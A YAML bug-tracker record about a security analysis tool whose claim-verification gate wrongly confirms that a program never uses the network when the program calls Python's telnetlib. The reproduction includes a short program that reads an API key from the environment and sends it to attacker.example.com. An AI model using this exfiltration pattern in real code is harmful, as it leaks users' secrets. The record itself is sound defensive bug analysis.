  data:  # cf82
    kind: invariant  # cf82
    title: "verify-claims returns CONFIRMED (exit 0) for 'never sends data over the network' on a program that telnets to a remote host and writes a secret — the gate treats stdlib NAME RECOGNITION as I/O ENUMERATION"  # cf82
    status: violated  # cf82
    priority: 0  # cf82
    parent:  # cf82
    tags:  # cf82
    - security  # cf82
    - verify_claims  # cf82
    - io_boundary  # cf82
    - false_confirm  # cf82
    - bucket_a  # cf82
    isbefore: []  # cf82
    duplicate_of: []  # cf82
    not_duplicate_of: []  # cf82
    pr_ref:  # cf82
    description: "REPRODUCED FIRST-HAND ON THE SHIPPED CLI, dev 45280d90, with a control firing in\nthe same session. No overlay, no flags, no third-party dependency, no catalogue\nedit. This is the exact failure the coverage gate was BUILT to close, still open\nfor 90% of the Python standard library.\n\n    # main.py\n    import telnetlib, os\n    def exfiltrate(secret):\n        conn = telnetlib.Telnet(\"attacker.example.com\", 23)\n        conn.write(secret.encode())\n        conn.close()\n    def main():\n        exfiltrate(os.environ[\"API_KEY\"])\n\n    claim: net_send / must_not_exist — \"never sends data over the network\"\n\n    $ hypergumbo verify-claims . --claims claims.yaml\n      v [no-net-send] this service never sends data over the network\n        Verdict: confirmed\n        No net_send chains found.\n      all 1 CONFIRMED (of 1 claim(s))                      EXIT=0\n\nCONTROL, same program shape, `requests.post` instead of telnetlib:\n      ? Verdict: inconclusive ... \"calls into 1 module(s) with no I/O catalog\n        coverage (requests) ... cannot confirm\"                EXIT=2\n\nSo the gate REFUSES on the library ADR-0016 declares out of scope, and WAVES\nTHROUGH the stdlib module it declares in scope. The safety property is inverted\nrelative to the policy.\n\nMECHANISM, verified in code and by direct call:\n  verify_claims.py:779   `if catalog.is_stdlib_module(module): continue`\n  is_stdlib_module(\"telnetlib\")          -> True\n  is_stdlib_module_complete(\"telnetlib\") -> False\npython.yaml enumerates 300 stdlib modules (mechanically, from\nsys.stdlib_module_names). Of those 300, 28 have ANY catalogue row and exactly\nONE — `math` — is flagged closed-world complete. telnetlib has zero rows.\nThe gate's own docstring (verify_claims.py:732) calls this branch \"an examined\nnegative\". For 272 of 300 modules nothing was examined.\n\n*** THE RIGHT PREDICATE ALREADY EXISTS AND THE GATE DOES NOT CALL IT. ***\n`stdlib_module_completeness` / `is_stdlib_module_complete` was designed\n2026-05-13 (176b063395) and documented in exactly the needed terms at\nio_boundary.py:672-680: \"Closed-world means we've enumerated every I/O primitive\nin this module, so an unmatched call to `module.X` is provably NOT I/O.\"\nIt has ONE production caller — io_boundary.py:1557 — and it is not the gate.\nSo the gate answers \"have I enumerated this module's I/O?\" by consulting an index\nthat answers \"do I recognise this name?\", and documents the answer as if it had\nasked the first question.\n\nWHY THIS OUTRANKS THE CATALOGUE-SCOPE QUESTION (WI-bahid / WI-sutuk / INV-zubuh).\nThose are about which rows belong in the catalogue. This fires with a catalogue\nthat is perfectly stdlib-pure, needs no third-party row, no overlay and no scope\nviolation, and it fires on the LANGUAGE THE PROJECT SUPPORTS BEST. INV-zubuh\n(row-presence granularity) is the sibling arm of the same error; this is the\nlarger one.\n\nTHE MIRROR ARM, same predicate, opposite failure: 13 of 14 catalogues have\n`stdlib_modules: 0`, so branch 1 is inert for them and every rowless module\nblocks. A Go program whose only I/O is os.WriteFile reportedly returns\ninconclusive naming `sort` and `strings`. I have NOT re-run that arm myself —\nreported by the investigation, not verified here.\n\nWHAT SELECTS BETWEEN THE TWO FAILURES is whether someone populated\n`stdlib_modules` for that language, which happened for Python as part of a\nSUPPLY-CHAIN feature (ADR-0041 ecosystem stamping), not for claim verification.\nNote also that rust.yaml and erlang.yaml declare `status: complete` yet have zero\nstdlib_modules, so gate strictness has no relationship to a catalogue's own\nself-declared completeness.\n\nDIRECTION OF ANY FIX IS TOWARD MORE `inconclusive`, which is the safe direction\nbut not a free one: switching the branch to `is_stdlib_module_complete` as it\nstands would make every Python claim inconclusive except calls into `math`. That\nis the blanket-downgrade failure this gate's first version already had and which\n`TestConfirmationIsPreservedWhereItIsEarned` exists to prevent. So the fix is not\na one-line predicate swap; it needs a real answer to \"what makes a module\nexamined\", and the honest interim may be to narrow the recognised-stdlib branch\nto modules that carry rows or a completeness flag, and measure the\ninconclusive-rate cost before shipping.\n\nFILED BY: the archaeology into why the catalogue is scoped the way it is. The\nquestion asked was \"was anyone thinking\"; the answer is yes, and this is the one\nplace where a documented intent and the implemented predicate diverged silently."  # cf82
    fields:  # cf82
      statement: "A claim may be confirmed only over modules whose I/O surface was actually enumerated, not merely recognised by name."  # cf82
      root_cause: "verify_claims.py:779 calls is_stdlib_module (membership in a 300-entry list generated from sys.stdlib_module_names) where its own docstring promises 'an examined negative'. The predicate that means that — is_stdlib_module_complete, designed 2026-05-13 — is never called by the gate; 1 of 300 modules carries the flag and 272 have no catalogue row at all."  # cf82
